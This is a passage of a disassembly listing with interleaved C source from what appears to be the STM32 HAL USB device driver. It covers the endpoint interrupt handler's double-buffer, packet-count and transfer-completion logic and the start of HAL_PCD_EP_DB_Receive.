          count = (uint16_t)PCD_GET_EP_RX_CNT(hpcd->Instance, ep->num);
 800281c:	687b      	ldr	r3, [r7, #4]
 800281e:	681b      	ldr	r3, [r3, #0]
 8002820:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002824:	b29b      	uxth	r3, r3
 8002826:	461a      	mov	r2, r3
 8002828:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800282a:	781b      	ldrb	r3, [r3, #0]
 800282c:	00db      	lsls	r3, r3, #3
 800282e:	4413      	add	r3, r2
 8002830:	687a      	ldr	r2, [r7, #4]
 8002832:	6812      	ldr	r2, [r2, #0]
 8002834:	4413      	add	r3, r2
 8002836:	f203 4306 	addw	r3, r3, #1030	; 0x406
 800283a:	881b      	ldrh	r3, [r3, #0]
 800283c:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002840:	f8a7 3050 	strh.w	r3, [r7, #80]	; 0x50

          if (count != 0U)
 8002844:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 8002848:	2b00      	cmp	r3, #0
 800284a:	f000 808e 	beq.w	800296a <PCD_EP_ISR_Handler+0x4d4>
          {
            USB_ReadPMA(hpcd->Instance, ep->xfer_buff, ep->pmaadress, count);
 800284e:	687b      	ldr	r3, [r7, #4]
 8002850:	6818      	ldr	r0, [r3, #0]
 8002852:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002854:	6959      	ldr	r1, [r3, #20]
 8002856:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002858:	88da      	ldrh	r2, [r3, #6]
 800285a:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 800285e:	f005 fdda 	bl	8008416 <USB_ReadPMA>
 8002862:	e082      	b.n	800296a <PCD_EP_ISR_Handler+0x4d4>
        }
#if (USE_USB_DOUBLE_BUFFER == 1U)
        else
        {
          /* manage double buffer bulk out */
          if (ep->type == EP_TYPE_BULK)
 8002864:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002866:	78db      	ldrb	r3, [r3, #3]
 8002868:	2b02      	cmp	r3, #2
 800286a:	d10a      	bne.n	8002882 <PCD_EP_ISR_Handler+0x3ec>
          {
            count = HAL_PCD_EP_DB_Receive(hpcd, ep, wEPVal);
 800286c:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8002870:	461a      	mov	r2, r3
 8002872:	6d79      	ldr	r1, [r7, #84]	; 0x54
 8002874:	6878      	ldr	r0, [r7, #4]
 8002876:	f000 f9d3 	bl	8002c20 <HAL_PCD_EP_DB_Receive>
 800287a:	4603      	mov	r3, r0
 800287c:	f8a7 3050 	strh.w	r3, [r7, #80]	; 0x50
 8002880:	e073      	b.n	800296a <PCD_EP_ISR_Handler+0x4d4>
          }
          else /* manage double buffer iso out */
          {
            /* free EP OUT Buffer */
            PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 0U);
 8002882:	687b      	ldr	r3, [r7, #4]
 8002884:	681b      	ldr	r3, [r3, #0]
 8002886:	461a      	mov	r2, r3
 8002888:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800288a:	781b      	ldrb	r3, [r3, #0]
 800288c:	009b      	lsls	r3, r3, #2
 800288e:	4413      	add	r3, r2
 8002890:	881b      	ldrh	r3, [r3, #0]
 8002892:	b29b      	uxth	r3, r3
 8002894:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8002898:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800289c:	f8a7 3052 	strh.w	r3, [r7, #82]	; 0x52
 80028a0:	687b      	ldr	r3, [r7, #4]
 80028a2:	681b      	ldr	r3, [r3, #0]
 80028a4:	461a      	mov	r2, r3
 80028a6:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80028a8:	781b      	ldrb	r3, [r3, #0]
 80028aa:	009b      	lsls	r3, r3, #2
 80028ac:	441a      	add	r2, r3
 80028ae:	f8b7 3052 	ldrh.w	r3, [r7, #82]	; 0x52
 80028b2:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80028b6:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80028ba:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80028be:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 80028c2:	b29b      	uxth	r3, r3
 80028c4:	8013      	strh	r3, [r2, #0]

            if ((PCD_GET_ENDPOINT(hpcd->Instance, ep->num) & USB_EP_DTOG_RX) != 0U)
 80028c6:	687b      	ldr	r3, [r7, #4]
 80028c8:	681b      	ldr	r3, [r3, #0]
 80028ca:	461a      	mov	r2, r3
 80028cc:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80028ce:	781b      	ldrb	r3, [r3, #0]
 80028d0:	009b      	lsls	r3, r3, #2
 80028d2:	4413      	add	r3, r2
 80028d4:	881b      	ldrh	r3, [r3, #0]
 80028d6:	b29b      	uxth	r3, r3
 80028d8:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 80028dc:	2b00      	cmp	r3, #0
 80028de:	d022      	beq.n	8002926 <PCD_EP_ISR_Handler+0x490>
            {
              /* read from endpoint BUF0Addr buffer */
              count = (uint16_t)PCD_GET_EP_DBUF0_CNT(hpcd->Instance, ep->num);
 80028e0:	687b      	ldr	r3, [r7, #4]
 80028e2:	681b      	ldr	r3, [r3, #0]
 80028e4:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80028e8:	b29b      	uxth	r3, r3
 80028ea:	461a      	mov	r2, r3
 80028ec:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80028ee:	781b      	ldrb	r3, [r3, #0]
 80028f0:	00db      	lsls	r3, r3, #3
 80028f2:	4413      	add	r3, r2
 80028f4:	687a      	ldr	r2, [r7, #4]
 80028f6:	6812      	ldr	r2, [r2, #0]
 80028f8:	4413      	add	r3, r2
 80028fa:	f203 4302 	addw	r3, r3, #1026	; 0x402
 80028fe:	881b      	ldrh	r3, [r3, #0]
 8002900:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002904:	f8a7 3050 	strh.w	r3, [r7, #80]	; 0x50

              if (count != 0U)
 8002908:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 800290c:	2b00      	cmp	r3, #0
 800290e:	d02c      	beq.n	800296a <PCD_EP_ISR_Handler+0x4d4>
              {
                USB_ReadPMA(hpcd->Instance, ep->xfer_buff, ep->pmaaddr0, count);
 8002910:	687b      	ldr	r3, [r7, #4]
 8002912:	6818      	ldr	r0, [r3, #0]
 8002914:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002916:	6959      	ldr	r1, [r3, #20]
 8002918:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800291a:	891a      	ldrh	r2, [r3, #8]
 800291c:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 8002920:	f005 fd79 	bl	8008416 <USB_ReadPMA>
 8002924:	e021      	b.n	800296a <PCD_EP_ISR_Handler+0x4d4>
              }
            }
            else
            {
              /* read from endpoint BUF1Addr buffer */
              count = (uint16_t)PCD_GET_EP_DBUF1_CNT(hpcd->Instance, ep->num);
 8002926:	687b      	ldr	r3, [r7, #4]
 8002928:	681b      	ldr	r3, [r3, #0]
 800292a:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800292e:	b29b      	uxth	r3, r3
 8002930:	461a      	mov	r2, r3
 8002932:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002934:	781b      	ldrb	r3, [r3, #0]
 8002936:	00db      	lsls	r3, r3, #3
 8002938:	4413      	add	r3, r2
 800293a:	687a      	ldr	r2, [r7, #4]
 800293c:	6812      	ldr	r2, [r2, #0]
 800293e:	4413      	add	r3, r2
 8002940:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8002944:	881b      	ldrh	r3, [r3, #0]
 8002946:	f3c3 0309 	ubfx	r3, r3, #0, #10
 800294a:	f8a7 3050 	strh.w	r3, [r7, #80]	; 0x50

              if (count != 0U)
 800294e:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 8002952:	2b00      	cmp	r3, #0
 8002954:	d009      	beq.n	800296a <PCD_EP_ISR_Handler+0x4d4>
              {
                USB_ReadPMA(hpcd->Instance, ep->xfer_buff, ep->pmaaddr1, count);
 8002956:	687b      	ldr	r3, [r7, #4]
 8002958:	6818      	ldr	r0, [r3, #0]
 800295a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800295c:	6959      	ldr	r1, [r3, #20]
 800295e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002960:	895a      	ldrh	r2, [r3, #10]
 8002962:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 8002966:	f005 fd56 	bl	8008416 <USB_ReadPMA>
          }
        }
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

        /* multi-packet on the NON control OUT endpoint */
        ep->xfer_count += count;
 800296a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800296c:	69da      	ldr	r2, [r3, #28]
 800296e:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 8002972:	441a      	add	r2, r3
 8002974:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002976:	61da      	str	r2, [r3, #28]
        ep->xfer_buff += count;
 8002978:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800297a:	695a      	ldr	r2, [r3, #20]
 800297c:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 8002980:	441a      	add	r2, r3
 8002982:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002984:	615a      	str	r2, [r3, #20]

        if ((ep->xfer_len == 0U) || (count < ep->maxpacket))
 8002986:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002988:	699b      	ldr	r3, [r3, #24]
 800298a:	2b00      	cmp	r3, #0
 800298c:	d005      	beq.n	800299a <PCD_EP_ISR_Handler+0x504>
 800298e:	f8b7 2050 	ldrh.w	r2, [r7, #80]	; 0x50
 8002992:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002994:	691b      	ldr	r3, [r3, #16]
 8002996:	429a      	cmp	r2, r3
 8002998:	d206      	bcs.n	80029a8 <PCD_EP_ISR_Handler+0x512>
        {
          /* RX COMPLETE */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
          hpcd->DataOutStageCallback(hpcd, ep->num);
#else
          HAL_PCD_DataOutStageCallback(hpcd, ep->num);
 800299a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800299c:	781b      	ldrb	r3, [r3, #0]
 800299e:	4619      	mov	r1, r3
 80029a0:	6878      	ldr	r0, [r7, #4]
 80029a2:	f009 ff3d 	bl	800c820 <HAL_PCD_DataOutStageCallback>
 80029a6:	e005      	b.n	80029b4 <PCD_EP_ISR_Handler+0x51e>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
        }
        else
        {
          (void)USB_EPStartXfer(hpcd->Instance, ep);
 80029a8:	687b      	ldr	r3, [r7, #4]
 80029aa:	681b      	ldr	r3, [r3, #0]
 80029ac:	6d79      	ldr	r1, [r7, #84]	; 0x54
 80029ae:	4618      	mov	r0, r3
 80029b0:	f003 ffe3 	bl	800697a <USB_EPStartXfer>
        }
      }

      if ((wEPVal & USB_EP_CTR_TX) != 0U)
 80029b4:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 80029b8:	f003 0380 	and.w	r3, r3, #128	; 0x80
 80029bc:	2b00      	cmp	r3, #0
 80029be:	f000 8121 	beq.w	8002c04 <PCD_EP_ISR_Handler+0x76e>
      {
        ep = &hpcd->IN_ep[epindex];
 80029c2:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 80029c6:	1c5a      	adds	r2, r3, #1
 80029c8:	4613      	mov	r3, r2
 80029ca:	009b      	lsls	r3, r3, #2
 80029cc:	4413      	add	r3, r2
 80029ce:	00db      	lsls	r3, r3, #3
 80029d0:	687a      	ldr	r2, [r7, #4]
 80029d2:	4413      	add	r3, r2
 80029d4:	657b      	str	r3, [r7, #84]	; 0x54

        /* clear int flag */
        PCD_CLEAR_TX_EP_CTR(hpcd->Instance, epindex);
 80029d6:	687b      	ldr	r3, [r7, #4]
 80029d8:	681b      	ldr	r3, [r3, #0]
 80029da:	461a      	mov	r2, r3
 80029dc:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 80029e0:	009b      	lsls	r3, r3, #2
 80029e2:	4413      	add	r3, r2
 80029e4:	881b      	ldrh	r3, [r3, #0]
 80029e6:	b29b      	uxth	r3, r3
 80029e8:	f423 43e1 	bic.w	r3, r3, #28800	; 0x7080
 80029ec:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80029f0:	f8a7 3042 	strh.w	r3, [r7, #66]	; 0x42
 80029f4:	687b      	ldr	r3, [r7, #4]
 80029f6:	681b      	ldr	r3, [r3, #0]
 80029f8:	461a      	mov	r2, r3
 80029fa:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 80029fe:	009b      	lsls	r3, r3, #2
 8002a00:	441a      	add	r2, r3
 8002a02:	f8b7 3042 	ldrh.w	r3, [r7, #66]	; 0x42
 8002a06:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8002a0a:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8002a0e:	b29b      	uxth	r3, r3
 8002a10:	8013      	strh	r3, [r2, #0]

        if (ep->type == EP_TYPE_ISOC)
 8002a12:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002a14:	78db      	ldrb	r3, [r3, #3]
 8002a16:	2b01      	cmp	r3, #1
 8002a18:	f040 80a2 	bne.w	8002b60 <PCD_EP_ISR_Handler+0x6ca>
        {
          ep->xfer_len = 0U;
 8002a1c:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002a1e:	2200      	movs	r2, #0
 8002a20:	619a      	str	r2, [r3, #24]

#if (USE_USB_DOUBLE_BUFFER == 1U)
          if (ep->doublebuffer != 0U)
 8002a22:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002a24:	7b1b      	ldrb	r3, [r3, #12]
 8002a26:	2b00      	cmp	r3, #0
 8002a28:	f000 8093 	beq.w	8002b52 <PCD_EP_ISR_Handler+0x6bc>
          {
            if ((wEPVal & USB_EP_DTOG_TX) != 0U)
 8002a2c:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8002a30:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8002a34:	2b00      	cmp	r3, #0
 8002a36:	d046      	beq.n	8002ac6 <PCD_EP_ISR_Handler+0x630>
            {
              PCD_SET_EP_DBUF0_CNT(hpcd->Instance, ep->num, ep->is_in, 0U);
 8002a38:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002a3a:	785b      	ldrb	r3, [r3, #1]
 8002a3c:	2b00      	cmp	r3, #0
 8002a3e:	d126      	bne.n	8002a8e <PCD_EP_ISR_Handler+0x5f8>
 8002a40:	687b      	ldr	r3, [r7, #4]
 8002a42:	681b      	ldr	r3, [r3, #0]
 8002a44:	627b      	str	r3, [r7, #36]	; 0x24
 8002a46:	687b      	ldr	r3, [r7, #4]
 8002a48:	681b      	ldr	r3, [r3, #0]
 8002a4a:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002a4e:	b29b      	uxth	r3, r3
 8002a50:	461a      	mov	r2, r3
 8002a52:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8002a54:	4413      	add	r3, r2
 8002a56:	627b      	str	r3, [r7, #36]	; 0x24
 8002a58:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002a5a:	781b      	ldrb	r3, [r3, #0]
 8002a5c:	00da      	lsls	r2, r3, #3
 8002a5e:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8002a60:	4413      	add	r3, r2
 8002a62:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002a66:	623b      	str	r3, [r7, #32]
 8002a68:	6a3b      	ldr	r3, [r7, #32]
 8002a6a:	881b      	ldrh	r3, [r3, #0]
 8002a6c:	b29b      	uxth	r3, r3
 8002a6e:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002a72:	b29a      	uxth	r2, r3
 8002a74:	6a3b      	ldr	r3, [r7, #32]
 8002a76:	801a      	strh	r2, [r3, #0]
 8002a78:	6a3b      	ldr	r3, [r7, #32]
 8002a7a:	881b      	ldrh	r3, [r3, #0]
 8002a7c:	b29b      	uxth	r3, r3
 8002a7e:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8002a82:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8002a86:	b29a      	uxth	r2, r3
 8002a88:	6a3b      	ldr	r3, [r7, #32]
 8002a8a:	801a      	strh	r2, [r3, #0]
 8002a8c:	e061      	b.n	8002b52 <PCD_EP_ISR_Handler+0x6bc>
 8002a8e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002a90:	785b      	ldrb	r3, [r3, #1]
 8002a92:	2b01      	cmp	r3, #1
 8002a94:	d15d      	bne.n	8002b52 <PCD_EP_ISR_Handler+0x6bc>
 8002a96:	687b      	ldr	r3, [r7, #4]
 8002a98:	681b      	ldr	r3, [r3, #0]
 8002a9a:	62fb      	str	r3, [r7, #44]	; 0x2c
 8002a9c:	687b      	ldr	r3, [r7, #4]
 8002a9e:	681b      	ldr	r3, [r3, #0]
 8002aa0:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002aa4:	b29b      	uxth	r3, r3
 8002aa6:	461a      	mov	r2, r3
 8002aa8:	6afb      	ldr	r3, [r7, #44]	; 0x2c
 8002aaa:	4413      	add	r3, r2
 8002aac:	62fb      	str	r3, [r7, #44]	; 0x2c
 8002aae:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002ab0:	781b      	ldrb	r3, [r3, #0]
 8002ab2:	00da      	lsls	r2, r3, #3
 8002ab4:	6afb      	ldr	r3, [r7, #44]	; 0x2c
 8002ab6:	4413      	add	r3, r2
 8002ab8:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002abc:	62bb      	str	r3, [r7, #40]	; 0x28
 8002abe:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8002ac0:	2200      	movs	r2, #0
 8002ac2:	801a      	strh	r2, [r3, #0]
 8002ac4:	e045      	b.n	8002b52 <PCD_EP_ISR_Handler+0x6bc>
            }
            else
            {
              PCD_SET_EP_DBUF1_CNT(hpcd->Instance, ep->num, ep->is_in, 0U);
 8002ac6:	687b      	ldr	r3, [r7, #4]
 8002ac8:	681b      	ldr	r3, [r3, #0]
 8002aca:	63fb      	str	r3, [r7, #60]	; 0x3c
 8002acc:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002ace:	785b      	ldrb	r3, [r3, #1]
 8002ad0:	2b00      	cmp	r3, #0
 8002ad2:	d126      	bne.n	8002b22 <PCD_EP_ISR_Handler+0x68c>
 8002ad4:	687b      	ldr	r3, [r7, #4]
 8002ad6:	681b      	ldr	r3, [r3, #0]
 8002ad8:	637b      	str	r3, [r7, #52]	; 0x34
 8002ada:	687b      	ldr	r3, [r7, #4]
 8002adc:	681b      	ldr	r3, [r3, #0]
 8002ade:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002ae2:	b29b      	uxth	r3, r3
 8002ae4:	461a      	mov	r2, r3
 8002ae6:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8002ae8:	4413      	add	r3, r2
 8002aea:	637b      	str	r3, [r7, #52]	; 0x34
 8002aec:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002aee:	781b      	ldrb	r3, [r3, #0]
 8002af0:	00da      	lsls	r2, r3, #3
 8002af2:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8002af4:	4413      	add	r3, r2
 8002af6:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8002afa:	633b      	str	r3, [r7, #48]	; 0x30
 8002afc:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8002afe:	881b      	ldrh	r3, [r3, #0]
 8002b00:	b29b      	uxth	r3, r3
 8002b02:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002b06:	b29a      	uxth	r2, r3
 8002b08:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8002b0a:	801a      	strh	r2, [r3, #0]
 8002b0c:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8002b0e:	881b      	ldrh	r3, [r3, #0]
 8002b10:	b29b      	uxth	r3, r3
 8002b12:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8002b16:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8002b1a:	b29a      	uxth	r2, r3
 8002b1c:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8002b1e:	801a      	strh	r2, [r3, #0]
 8002b20:	e017      	b.n	8002b52 <PCD_EP_ISR_Handler+0x6bc>
 8002b22:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002b24:	785b      	ldrb	r3, [r3, #1]
 8002b26:	2b01      	cmp	r3, #1
 8002b28:	d113      	bne.n	8002b52 <PCD_EP_ISR_Handler+0x6bc>
 8002b2a:	687b      	ldr	r3, [r7, #4]
 8002b2c:	681b      	ldr	r3, [r3, #0]
 8002b2e:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002b32:	b29b      	uxth	r3, r3
 8002b34:	461a      	mov	r2, r3
 8002b36:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8002b38:	4413      	add	r3, r2
 8002b3a:	63fb      	str	r3, [r7, #60]	; 0x3c
 8002b3c:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002b3e:	781b      	ldrb	r3, [r3, #0]
 8002b40:	00da      	lsls	r2, r3, #3
 8002b42:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8002b44:	4413      	add	r3, r2
 8002b46:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8002b4a:	63bb      	str	r3, [r7, #56]	; 0x38
 8002b4c:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8002b4e:	2200      	movs	r2, #0
 8002b50:	801a      	strh	r2, [r3, #0]

          /* TX COMPLETE */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
          hpcd->DataInStageCallback(hpcd, ep->num);
#else
          HAL_PCD_DataInStageCallback(hpcd, ep->num);
 8002b52:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002b54:	781b      	ldrb	r3, [r3, #0]
 8002b56:	4619      	mov	r1, r3
 8002b58:	6878      	ldr	r0, [r7, #4]
 8002b5a:	f009 fe7c 	bl	800c856 <HAL_PCD_DataInStageCallback>
 8002b5e:	e051      	b.n	8002c04 <PCD_EP_ISR_Handler+0x76e>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
        }
        else
        {
          /* Manage Single Buffer Transaction */
          if ((wEPVal & USB_EP_KIND) == 0U)
 8002b60:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8002b64:	f403 7380 	and.w	r3, r3, #256	; 0x100
 8002b68:	2b00      	cmp	r3, #0
 8002b6a:	d144      	bne.n	8002bf6 <PCD_EP_ISR_Handler+0x760>
          {
            /* multi-packet on the NON control IN endpoint */
            TxPctSize = (uint16_t)PCD_GET_EP_TX_CNT(hpcd->Instance, ep->num);
 8002b6c:	687b      	ldr	r3, [r7, #4]
 8002b6e:	681b      	ldr	r3, [r3, #0]
 8002b70:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002b74:	b29b      	uxth	r3, r3
 8002b76:	461a      	mov	r2, r3
 8002b78:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002b7a:	781b      	ldrb	r3, [r3, #0]
 8002b7c:	00db      	lsls	r3, r3, #3
 8002b7e:	4413      	add	r3, r2
 8002b80:	687a      	ldr	r2, [r7, #4]
 8002b82:	6812      	ldr	r2, [r2, #0]
 8002b84:	4413      	add	r3, r2
 8002b86:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002b8a:	881b      	ldrh	r3, [r3, #0]
 8002b8c:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002b90:	f8a7 3040 	strh.w	r3, [r7, #64]	; 0x40

            if (ep->xfer_len > TxPctSize)
 8002b94:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002b96:	699a      	ldr	r2, [r3, #24]
 8002b98:	f8b7 3040 	ldrh.w	r3, [r7, #64]	; 0x40
 8002b9c:	429a      	cmp	r2, r3
 8002b9e:	d907      	bls.n	8002bb0 <PCD_EP_ISR_Handler+0x71a>
            {
              ep->xfer_len -= TxPctSize;
 8002ba0:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002ba2:	699a      	ldr	r2, [r3, #24]
 8002ba4:	f8b7 3040 	ldrh.w	r3, [r7, #64]	; 0x40
 8002ba8:	1ad2      	subs	r2, r2, r3
 8002baa:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002bac:	619a      	str	r2, [r3, #24]
 8002bae:	e002      	b.n	8002bb6 <PCD_EP_ISR_Handler+0x720>
            }
            else
            {
              ep->xfer_len = 0U;
 8002bb0:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002bb2:	2200      	movs	r2, #0
 8002bb4:	619a      	str	r2, [r3, #24]
            }

            /* Zero Length Packet? */
            if (ep->xfer_len == 0U)
 8002bb6:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002bb8:	699b      	ldr	r3, [r3, #24]
 8002bba:	2b00      	cmp	r3, #0
 8002bbc:	d106      	bne.n	8002bcc <PCD_EP_ISR_Handler+0x736>
            {
              /* TX COMPLETE */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
              hpcd->DataInStageCallback(hpcd, ep->num);
#else
              HAL_PCD_DataInStageCallback(hpcd, ep->num);
 8002bbe:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002bc0:	781b      	ldrb	r3, [r3, #0]
 8002bc2:	4619      	mov	r1, r3
 8002bc4:	6878      	ldr	r0, [r7, #4]
 8002bc6:	f009 fe46 	bl	800c856 <HAL_PCD_DataInStageCallback>
 8002bca:	e01b      	b.n	8002c04 <PCD_EP_ISR_Handler+0x76e>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
            }
            else
            {
              /* Transfer is not yet Done */
              ep->xfer_buff += TxPctSize;
 8002bcc:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002bce:	695a      	ldr	r2, [r3, #20]
 8002bd0:	f8b7 3040 	ldrh.w	r3, [r7, #64]	; 0x40
 8002bd4:	441a      	add	r2, r3
 8002bd6:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002bd8:	615a      	str	r2, [r3, #20]
              ep->xfer_count += TxPctSize;
 8002bda:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002bdc:	69da      	ldr	r2, [r3, #28]
 8002bde:	f8b7 3040 	ldrh.w	r3, [r7, #64]	; 0x40
 8002be2:	441a      	add	r2, r3
 8002be4:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002be6:	61da      	str	r2, [r3, #28]
              (void)USB_EPStartXfer(hpcd->Instance, ep);
 8002be8:	687b      	ldr	r3, [r7, #4]
 8002bea:	681b      	ldr	r3, [r3, #0]
 8002bec:	6d79      	ldr	r1, [r7, #84]	; 0x54
 8002bee:	4618      	mov	r0, r3
 8002bf0:	f003 fec3 	bl	800697a <USB_EPStartXfer>
 8002bf4:	e006      	b.n	8002c04 <PCD_EP_ISR_Handler+0x76e>
          }
#if (USE_USB_DOUBLE_BUFFER == 1U)
          /* Double Buffer bulk IN (bulk transfer Len > Ep_Mps) */
          else
          {
            (void)HAL_PCD_EP_DB_Transmit(hpcd, ep, wEPVal);
 8002bf6:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8002bfa:	461a      	mov	r2, r3
 8002bfc:	6d79      	ldr	r1, [r7, #84]	; 0x54
 8002bfe:	6878      	ldr	r0, [r7, #4]
 8002c00:	f000 f917 	bl	8002e32 <HAL_PCD_EP_DB_Transmit>
  while ((hpcd->Instance->ISTR & USB_ISTR_CTR) != 0U)
 8002c04:	687b      	ldr	r3, [r7, #4]
 8002c06:	681b      	ldr	r3, [r3, #0]
 8002c08:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8002c0c:	b29b      	uxth	r3, r3
 8002c0e:	b21b      	sxth	r3, r3
 8002c10:	2b00      	cmp	r3, #0
 8002c12:	f6ff ac45 	blt.w	80024a0 <PCD_EP_ISR_Handler+0xa>
        }
      }
    }
  }

  return HAL_OK;
 8002c16:	2300      	movs	r3, #0
}
 8002c18:	4618      	mov	r0, r3
 8002c1a:	3758      	adds	r7, #88	; 0x58
 8002c1c:	46bd      	mov	sp, r7
 8002c1e:	bd80      	pop	{r7, pc}

08002c20 <HAL_PCD_EP_DB_Receive>:
  * @param  wEPVal Last snapshot of EPRx register value taken in ISR
  * @retval HAL status
  */
static uint16_t HAL_PCD_EP_DB_Receive(PCD_HandleTypeDef *hpcd,
                                      PCD_EPTypeDef *ep, uint16_t wEPVal)
{
 8002c20:	b580      	push	{r7, lr}
 8002c22:	b088      	sub	sp, #32
 8002c24:	af00      	add	r7, sp, #0
 8002c26:	60f8      	str	r0, [r7, #12]
 8002c28:	60b9      	str	r1, [r7, #8]
 8002c2a:	4613      	mov	r3, r2
 8002c2c:	80fb      	strh	r3, [r7, #6]
  uint16_t count;

  /* Manage Buffer0 OUT */
  if ((wEPVal & USB_EP_DTOG_RX) != 0U)
 8002c2e:	88fb      	ldrh	r3, [r7, #6]
 8002c30:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8002c34:	2b00      	cmp	r3, #0
